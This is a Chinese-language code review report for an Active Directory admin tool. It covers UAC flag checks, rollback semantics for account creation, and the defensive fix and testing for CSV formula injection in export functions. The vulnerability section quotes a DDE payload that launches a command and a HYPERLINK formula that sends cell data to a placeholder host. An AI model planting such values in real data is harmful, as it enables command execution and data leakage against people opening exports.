## 2. 逐条对账

### 2.1 UAC 位（KB305144 ↔ `utils.py:134-154`）

**20/22 对齐**，唯一缺失：

| 位 | 值 | 我的状态 |
|---|---|---|
| `PARTIAL_SECRETS_ACCOUNT` | 0x04000000 | ❌ **未定义**（RODC 上的"只读账户"标记） |

另外 KB305144 明确指出：**Windows Server 2003 起 `LOCKOUT`(0x10) 与 `PASSWORD_EXPIRED`(0x800000) 已由
`ms-DS-User-Account-Control-Computed` 取代** —— 本项目已按此实现（读构造属性），这一条是**对的**。

## 3. 一处"本来要你拍板、其实官方已有答案"的问题

**问题**（此前挂在「待拍板」里）：`create_user` 第③步（启用）失败时，要不要回滚已建的对象？

**Microsoft Learn 对 `-AccountPassword` 的原文**：

> "User accounts, by default, are created without a password. … **The account is created if the password
> fails for any reason.**"
> "In order to ensure that accounts remain secure, **user accounts will never be enabled unless a valid
> password is set** or `PasswordNotRequired` is set to `$True`."

**⇒ 官方语义 = 不回滚**：对象照建、**保持禁用**，密码稍后用 `Set-ADAccountPassword` 补。
这正是本项目"建号 514 → 设密 → 512"三步的官方依据；第③步失败时**保留 514（禁用）状态**才是对标行为，
而不是删掉对象。

## 5. 顺手验出的一个真实安全缺口（P0）

**位置**：`ui_browser.py:1921 _write_csv()`（列表导出）、`audit.py export_csv()`（日志导出）

**现状**：直接用 `csv.writer` 写 AD 字段值。`csv.writer` 只保证 **CSV 语法**正确
（逗号/引号转义），**不阻止 Excel 把单元格当公式执行**。

**可利用性**：AD 里的 `displayName` / `description` / `title` 这类字段是**可控输入** ——
任何能在 AD 中修改自己显示名的人（或被委派了改属性的低权账号）都可以写入
`=cmd|'/c calc'!A0`、`=HYPERLINK("http://x/?"&A1,"点我")` 这类值。
**运维导出、用 Excel 打开**即触发（DDE / 外链）。

**成熟项目的做法**：`chrisdfennell/ad-tools`（Flask + ldap3）专门有
`test_csv_export.py — Spreadsheet formula injection in exported CSVs`。

**修法**：写值前，对以 `=` `+` `-` `@` `\t` `\r` 开头的字符串加一个前缀（`'`），
并配一条反证型用例（喂一个 `=1+1` 看是否被转义）。

### ✅ 已修（09-15 当天闭环）

**唯一实现**：`utils.defuse_csv_cell()` + 前缀表 `utils.CSV_FORMULA_PREFIXES`
（OWASP 核心四字符 + 控制字符，与 `defusedcsv` 取并集；文档字符串写明了
「为什么选 `'` 而不是 tab 前缀」「Excel 另存再打开可能吃掉转义」这两个取舍）。

**两个调用点都改用它**（本项目「只有一份实现」）：
* `ui_browser._write_csv` → `writer.writerow([defuse_csv_cell(value) for value in cells])`
* `audit.export_csv` → `{k: defuse_csv_cell(row.get(k, "")) for k in columns}`

**判据三层**（各管一段，互相补位）：

| 层 | 位置 | 管什么 |
|---|---|---|
| 函数单测（8 例） | `tests/test_utils.py::TestCsvFormulaDefusing` | 前缀表逐个生效、正常值不误伤、空值/None、幂等、**以及那个故意保留的取舍**（`-5` 会变文本，用例名里写明"别顺手改掉"） |
| 集成（各 2 例） | `tests/test_audit.py`、`tests/test_ui_smoke.py` | 证明**两条真实导出路径真的用了它** —— 单测证明"函数对"，这两条证明"接得上" |
| **静态红线** | `tests/test_source_hygiene.py::TestNoUnsanitizedCsvExport` | **以后新加的导出点自动被覆盖**：凡是写了 `writerow/writerows` 的函数都必须出现 `defuse_csv_cell` 的调用。新加导出点无需登记 |

静态判据自带 13 条自检（正例放行 / 反例命中 / **推导式里的调用要认出来** /
**只在 docstring 里提一句不算** / 只读 CSV 不误伤 / 只写表头不算 / 嵌套函数只报一次 /
`writerows` 也要认 / 语法错误要报出来）。其中「嵌套只报一次」当场抓出了我装置的
一个真 bug（外层函数被重复报），已修。

**反证**：`tools/counterproof_csv_injection.py`，C35~C39 五组**全部精确变红**、
源码 md5 全部核对还原：

| 组 | 把什么改坏 | 期望/实际变红 |
|---|---|---|
| C35 | `defuse_csv_cell` 改为原样返回 | 函数自身 4 条（恰好） |
| C36 | 同上，跑审计模块 | `test_export_defuses_formula_injection` |
| C37 | 同上，跑界面模块 | `test_table_export_csv_defuses_formula_injection` |
| C38 | 从 `_write_csv` 删掉调用 | 静态红线 1 条 |
| C39 | 从 `export_csv` 删掉调用 | 静态红线 1 条 |

> C38/C39 **刻意分开**：只改一处时静态红线必须**只红一条** ——
> 否则说明它是按文件报的而不是按函数报的，会漏掉"新导出点忘了防护"。

**验收**：全量 **1017 例全绿 / 149.7s / 退出码 0**（原 992 例，新增 25 例）。
